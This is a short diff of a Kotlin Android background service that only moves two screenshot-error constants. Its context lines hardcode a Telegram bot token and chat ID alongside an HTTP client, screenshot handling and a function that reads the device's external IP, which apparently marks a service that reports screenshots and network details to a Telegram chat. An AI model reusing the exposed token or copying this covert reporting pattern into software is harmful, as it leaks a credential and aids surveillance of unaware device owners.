@@ -27,17 +27,19 @@ import java.util.*
 import java.util.concurrent.TimeUnit
 import kotlin.coroutines.resume
 
+
+
+
+const val ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR = "Screenshot error"
+const val ERROR_TAKE_SCREENSHOT_INTERNAL_TIME = "Screenshot timeout"
+
+
 class MyService : Service() {
 
     companion object {
         const val BOT_TOKEN = "8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc"
         const val CHAT_ID = "8820979221"
         private val client = OkHttpClient()
-
-
-
-const val ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR = "Screenshot error"
-const val ERROR_TAKE_SCREENSHOT_INTERNAL_TIME = "Screenshot timeout"
 
 fun getExternalIP(): String {
     return try {
